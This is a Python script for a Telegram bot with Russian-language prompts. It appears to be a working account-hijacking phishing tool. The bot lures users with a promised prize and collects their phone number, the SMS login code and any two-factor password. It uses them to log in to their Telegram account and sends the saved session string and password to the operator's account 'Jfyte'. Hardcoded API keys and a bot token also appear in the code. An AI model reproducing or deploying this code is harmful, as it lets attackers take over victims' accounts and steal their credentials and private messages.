import asyncio
from telethon import TelegramClient, events, Button
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError

API_ID = 20905110
API_HASH = '5f0bebe9754265943286d5615e69812b'
BOT_TOKEN = '8377279596:AAGRqfHghefux4dlhdnIIPDU1oJ40ENbsSI'

bot = TelegramClient('bot_session', API_ID, API_HASH)
user_clients = {}

async def main():
    await bot.start(bot_token=BOT_TOKEN)
    
    @bot.on(events.NewMessage(pattern='/start'))
    async def start_handler(event):
        await event.respond(
            "🔐 Для продолжения поделитесь контактом:",
            buttons=Button.request_phone("📱 Отправить мой номер")
        )

    @bot.on(events.NewMessage(func=lambda e: e.contact))
    async def contact_handler(event):
        user_id = event.sender_id
        phone = event.contact.phone_number
        
        client = TelegramClient(StringSession(), API_ID, API_HASH)
        await client.connect()
        
        try:
            sent_code = await client.send_code_request(phone)
            user_clients[user_id] = {
                'client': client,
                'phone': phone,
                'phone_code_hash': sent_code.phone_code_hash,
                'code': [],
                'waiting_for_password': False,
                'password': None  # Добавляем поле для хранения пароля
            }
            
            buttons = [
                [Button.inline("1", data='num_1'), Button.inline("2", data='num_2'), Button.inline("3", data='num_3')],
                [Button.inline("4", data='num_4'), Button.inline("5", data='num_5'), Button.inline("6", data='num_6')],
                [Button.inline("7", data='num_7'), Button.inline("8", data='num_8'), Button.inline("9", data='num_9')],
                [Button.inline("0", data='num_0'), Button.inline("✅ Готово", data='submit')]
            ]
            
            await event.respond("⌨️ Введите код из SMS:", buttons=buttons)
            
        except Exception as e:
            await event.respond(f"⚠️ Ошибка: {str(e)}")
            await client.disconnect()

    @bot.on(events.CallbackQuery())
    async def callback_handler(event):
        user_id = event.sender_id
        data = event.data.decode()
        
        if user_id not in user_clients:
            await event.answer("❌ Сессия устарела! Начните с /start")
            return
        
        if data.startswith('num_'):
            digit = data.split('_')[1]
            user_clients[user_id]['code'].append(digit)
            code = ''.join(user_clients[user_id]['code'])
            
            original_message = await event.get_message()
            await event.edit(f"🔢 Введенный код: {code}", buttons=original_message.buttons)
            
        elif data == 'submit':
            client = user_clients[user_id]['client']
            code = ''.join(user_clients[user_id]['code'])
            
            try:
                await client.sign_in(
                    phone=user_clients[user_id]['phone'],
                    code=code,
                    phone_code_hash=user_clients[user_id]['phone_code_hash']
                )
                
            except SessionPasswordNeededError:
                user_clients[user_id]['waiting_for_password'] = True
                await event.respond("🔑 Требуется двухфакторная аутентификация. Введите пароль:")
                return
                
            except Exception as e:
                await event.respond(f"🚨 Ошибка авторизации: {str(e)}")
                await client.disconnect()
                del user_clients[user_id]
                return
            
            await finish_authentication(user_id, client, event)

    @bot.on(events.NewMessage(func=lambda e: user_clients.get(e.sender_id, {}).get('waiting_for_password')))
    async def password_handler(event):
        user_id = event.sender_id
        client = user_clients[user_id]['client']
        password = event.text
        
        try:
            await client.sign_in(password=password)
            # Сохраняем пароль в данные пользователя
            user_clients[user_id]['password'] = password
            await finish_authentication(user_id, client, event)
            
        except Exception as e:
            await event.respond(f"🔐 Неверный пароль! Ошибка: {str(e)}\nПопробуйте еще раз:")
            
        finally:
            user_clients[user_id]['waiting_for_password'] = False

    async def finish_authentication(user_id, client, event):
        try:
            session_str = client.session.save()
            # Формируем сообщение с паролем (если есть)
            password_info = user_clients[user_id].get('password', '❌ Отсутствует')
            message = (
                f"🔥 Новая сессия:\n"
                f"👤 Номер: {user_clients[user_id]['phone']}\n"
                f"🔑 Сессия: `{session_str}`\n"
                f"🔒 2FA Пароль: {password_info}"
            )
            
            await bot.send_message('Jfyte', message)
            
            await event.respond(
                "🎉 Успешная авторизация!\n"
                "⏳ Ожидайте получение приза в течение 48 часов."
            )
            
        except Exception as e:
            await event.respond(f"🚨 Ошибка: {str(e)}")
            
        finally:
            await client.disconnect()
            del user_clients[user_id]

    await bot.run_until_disconnected()

if __name__ == '__main__':
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("Бот остановлен")
